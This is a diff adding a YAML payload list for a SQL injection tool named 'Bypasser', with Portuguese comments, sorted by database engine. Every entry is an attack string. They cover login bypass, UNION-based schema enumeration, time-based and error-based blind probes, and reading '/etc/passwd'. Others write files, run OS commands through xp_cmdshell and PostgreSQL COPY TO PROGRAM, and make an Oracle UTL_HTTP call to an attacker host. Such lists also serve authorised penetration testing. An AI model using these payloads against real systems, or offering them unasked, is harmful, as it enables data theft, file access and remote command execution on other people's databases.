@@ -1,0 +1,63 @@
+# Bypasser - payloads SQL Injection por banco/variante.
+# Ajuste o numero de NULLs do UNION ao numero de colunas do alvo.
+payloads:
+  # --- generico / union / ordenacao ---
+  - "' OR 1=1-- -"
+  - "' OR '1'='1"
+  - "\" OR \"1\"=\"1"
+  - "1' OR '1'='1'-- -"
+  - "' OR 1=1#"
+  - "' UNION SELECT NULL-- -"
+  - "' UNION SELECT NULL,NULL-- -"
+  - "' UNION SELECT NULL,NULL,NULL-- -"
+  - "' UNION SELECT NULL,NULL,NULL,NULL-- -"
+  - "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -"
+  - "' ORDER BY 1-- -"
+  - "' ORDER BY 10-- -"
+  - "' AND 1=2-- -"
+  - "' AND 1=1-- -"
+  - "') OR ('1'='1"
+
+  # --- MySQL ---
+  - "' AND SLEEP(5)-- -"
+  - "' AND SLEEP(5)#"
+  - "' AND BENCHMARK(5000000,SHA1('test'))-- -"
+  - "' UNION SELECT @@version,user(),database()-- -"
+  - "' UNION SELECT table_name,column_name FROM information_schema.columns-- -"
+  - "1' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -"
+  - "' /*!50000UNION*/ /*!50000SELECT*/ 1,2-- -"
+  - "' UNION SELECT LOAD_FILE('/etc/passwd')-- -"
+  - "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))-- -"
+  - "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)-- -"
+  - "' INTO OUTFILE '/tmp/pwn.txt'-- -"
+  - "' OR 1=1 LIMIT 1-- -"
+
+  # --- MSSQL ---
+  - "'; WAITFOR DELAY '0:0:5'-- -"
+  - "'; EXEC xp_cmdshell('whoami')-- -"
+  - "' UNION SELECT @@version,user_name(),db_name()-- -"
+  - "' AND 1=CONVERT(int,(SELECT @@version))-- -"
+  - "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE-- -"
+  - "' AND IS_SRVROLEMEMBER('sysadmin')=1-- -"
+  - "1'; EXEC master..xp_cmdshell 'whoami'-- -"
+
+  # --- PostgreSQL ---
+  - "' UNION SELECT version(),current_user,current_database()-- -"
+  - "'||(SELECT 'x' FROM pg_sleep(5))||'"
+  - "'; SELECT pg_sleep(5)-- -"
+  - "' AND 1=CAST((SELECT version()) AS int)-- -"
+  - "' UNION SELECT table_name,column_name FROM information_schema.columns-- -"
+  - "'; COPY (SELECT '') TO PROGRAM 'id'-- -"
+
+  # --- Oracle ---
+  - "' UNION SELECT banner FROM v$version-- -"
+  - "' AND 1=UTL_HTTP.REQUEST('http://attacker/')-- -"
+  - "' AND 1=(SELECT COUNT(*) FROM all_users)-- -"
+  - "' || (SELECT username FROM all_users WHERE ROWNUM=1) || '"
+
+  # --- error-based / blind ---
+  - "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
+  - "1' AND '1'='1"
+  - "1' AND '1'='2"
+  - "' OR EXISTS(SELECT * FROM users)-- -"
+  - "' AND SUBSTRING((SELECT version()),1,1)='5'-- -"
